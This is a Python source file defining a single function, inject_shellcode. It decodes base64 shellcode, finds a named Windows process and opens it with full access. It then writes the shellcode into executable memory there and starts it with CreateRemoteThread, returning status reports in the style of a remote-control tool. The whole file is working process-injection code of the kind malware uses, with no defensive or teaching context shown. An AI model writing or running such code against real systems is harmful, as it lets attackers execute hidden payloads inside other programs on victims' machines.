import ctypes
import logging
from datetime import datetime
import platform
import base64

def inject_shellcode(process_name, shellcode_b64):
    """Inject shellcode into a target process"""
    try:
        # Decode shellcode
        shellcode = base64.b64decode(shellcode_b64)
        
        if platform.system() != 'Windows':
            return {
                'status': 'error',
                'error': 'Shellcode injection only supported on Windows',
                'timestamp': datetime.now().isoformat()
            }
            
        # Required Windows API functions
        kernel32 = ctypes.windll.kernel32
        OpenProcess = kernel32.OpenProcess
        VirtualAllocEx = kernel32.VirtualAllocEx
        WriteProcessMemory = kernel32.WriteProcessMemory
        CreateRemoteThread = kernel32.CreateRemoteThread
        CloseHandle = kernel32.CloseHandle
        
        # Constants
        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        # Find target process
        import psutil
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                target_pid = proc.info['pid']
                break
                
        if not target_pid:
            return {
                'status': 'error',
                'error': f'Process {process_name} not found',
                'timestamp': datetime.now().isoformat()
            }
            
        # Open target process
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            return {
                'status': 'error',
                'error': f'Failed to open process {process_name}',
                'timestamp': datetime.now().isoformat()
            }
            
        try:
            # Allocate memory in target process
            shellcode_length = len(shellcode)
            memory_address = VirtualAllocEx(
                process_handle,
                None,
                shellcode_length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not memory_address:
                return {
                    'status': 'error',
                    'error': 'Failed to allocate memory in target process',
                    'timestamp': datetime.now().isoformat()
                }
                
            # Write shellcode to allocated memory
            write_result = WriteProcessMemory(
                process_handle,
                memory_address,
                shellcode,
                shellcode_length,
                None
            )
            
            if not write_result:
                return {
                    'status': 'error',
                    'error': 'Failed to write shellcode to target process',
                    'timestamp': datetime.now().isoformat()
                }
                
            # Create remote thread to execute shellcode
            thread_handle = CreateRemoteThread(
                process_handle,
                None,
                0,
                memory_address,
                None,
                0,
                None
            )
            
            if not thread_handle:
                return {
                    'status': 'error',
                    'error': 'Failed to create remote thread',
                    'timestamp': datetime.now().isoformat()
                }
                
            return {
                'status': 'success',
                'message': f'Shellcode injected into {process_name} (PID: {target_pid})',
                'timestamp': datetime.now().isoformat(),
                'details': {
                    'process_name': process_name,
                    'pid': target_pid,
                    'shellcode_length': shellcode_length,
                    'memory_address': hex(memory_address)
                }
            }
            
        finally:
            CloseHandle(process_handle)
            
    except Exception as e:
        logging.error(f"Error injecting shellcode: {str(e)}")
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        } 